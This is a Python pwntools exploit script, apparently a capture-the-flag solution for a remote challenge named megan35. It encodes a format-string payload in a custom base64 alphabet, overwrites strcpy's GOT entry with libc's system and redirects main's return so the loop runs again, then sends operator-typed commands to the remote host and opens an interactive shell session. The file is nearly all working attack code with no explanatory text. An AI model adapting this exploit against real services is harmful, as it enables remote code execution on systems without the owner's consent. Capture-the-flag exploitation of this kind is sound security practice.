from pwn import *
import subprocess, sys, os, base64

megan35 = "3GHIJKLMNOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5"

class B64weird_encodings:
 
    def __init__(self, translation):
        b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
        self.srch = dict(zip(b, translation))
        self.revlsrch = dict(zip(translation, b))
 
    def encode(self, pt):
        global srch
        b64 = base64.b64encode(pt)
        r = "".join([self.srch[x] for x in b64])
        return r
 
    def decode(self, code):
        global revlsrch
        b64 = "".join([self.revlsrch[x] for x in code])
        r = base64.b64decode(b64)
        return r    
 
def encode(variant, pt):
    encoder = B64weird_encodings(variant)
    return encoder.encode(pt)
 
def decode(variant, code):
    try:
        encoder = B64weird_encodings(variant)
        return encoder.decode(code)
    except KeyError:
        return "Not valid"
    except TypeError:
        return "Padding iccorrect"
 
e = ELF('libc.so.6')

libcbase = 0xf7e19000
system = libcbase + 0x5f065
strcpy_got = 0x0804A01C
main_ret = 0xffffd67c+0x750
main = 0x80484e0

payload = fmtstr_payload(71,{main_ret:main,strcpy_got:system},write_size='byte')+"bbbb"
payload.encode("hex")
payload = encode(megan35,payload)
print payload
p = connect("megan35.stillhackinganyway.nl",3535)
p.recv()
p.sendline(payload)

p.recvuntil("bbbb")
print p.recv()

cmd = raw_input("> ")[:-1]
cmd = encode(megan35,cmd)
p.sendline(cmd)
p.interactive()
